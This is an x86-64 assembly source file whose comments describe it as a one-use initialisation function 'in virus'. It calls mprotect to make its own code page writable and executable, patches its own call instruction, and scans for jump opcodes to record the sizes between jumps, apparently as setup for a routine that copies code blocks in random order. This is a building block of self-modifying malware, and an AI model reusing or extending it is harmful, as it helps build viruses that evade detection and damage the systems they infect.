
#####
#	get addr of main(main need to be in the begining, just after the jump)
#	after main we have the function to memcpy with random, and after this init function (mem)
#	this function will be erased and have in :
#		(mem : addr of last jump, don't go after)
#		(mem + 8 : the first jump, don't go before)
#	this function write the size between jump
#	the ret go back before the call, and call the memcpyrng
#####

	.text
	.globl	mem
mem: ## it is a one use function(in virus), calcul the size and set the min addr, and max addr, store here
.addrend:
	sub	$6, (%rsp)
	add	$6, %rbx
.addrfirst:
	push	%rbx
	mov	8(%rsp), %rbx
	push	%rbx
	pushq	%rbp

	sub	$16, %rsp
	mov	%rsp, %rbp
	pushq	%rbp
	mov	%rsp, 8(%rbp)

	mov	0x28(%rsp), %rbx
	sub	$6, %rbx

	mov	$10, %rax
	mov	%rbx, %rdi
	mov	%rbx, %r8
	and	$4095, %r8
	xor	%r8, %rdi
	
	mov	$4096, %rsi
	mov	$7, %rdx
	syscall #appel mpotect for write in exec segment
	
	mov	0x20(%rsp), %rax
	sub	$3, 3(%rax) #call(mem)->call(p)
	jmp	.loop
.loop:
	sub     $6, %rbx
	mov	(%rbx), %rax
	cmp	$0xe9, %al
	jne	.end1
	shr	$8, %rax
	cmp	$0, %eax
	jl	.loop
	push	%rax
	jmp	.loop

.endmax:
	movb	$0, 4(%rbx)
	mov	(%rbx), %eax
	add	%rbx, %rax
	mov	%rax, .addrend(%rip) ##mem, addr max, don't go after
	jmp	.f1

.end1:
	add	$6, %rbx # decal for going in first addr '0xe9'
	mov	%rbx, .addrfirst(%rip) ##mem + 8, first addr of jump
	mov	%rsp, (%rbp)
	sub	$5, %rbx # decal for going in addr after the next '0xe9'
	jmp	.f1
.loop1:
	cmp	$-1, %eax # unique case, get addr of last jump
	je	.endmax
	sub	(%rbx), %eax
	mov	%al, 4(%rbx) # conserve the size

.f1:
	cmp	8(%rbp), %rsp
	je	.end
	add	$6, %rbx
	movb	$0, 4(%rbx)
	mov	(%rbx), %edx
	cmp	%edx, (%rsp)
	jne	.f1
	pop	%rdx
	mov	(%rbp), %rcx
	mov	$-1, %eax

.loop2:
	cmp	%rbp, (%rcx)
	je	.loop1
	mov	(%rcx), %edx
	cmp	(%rbx), %edx
	jle	.loadd
	cmp	%edx, %eax
	jb	.loadd
	mov	%edx, %eax
		
.loadd:
	add	$8, %rcx
	jmp	.loop2
	
	
.end:
	mov	%rbp, %rsp
	add	$16, %rsp
	popq	%rbp
	pop	%rbx
	pop	%rbx
	ret
	.size	mem, .-mem
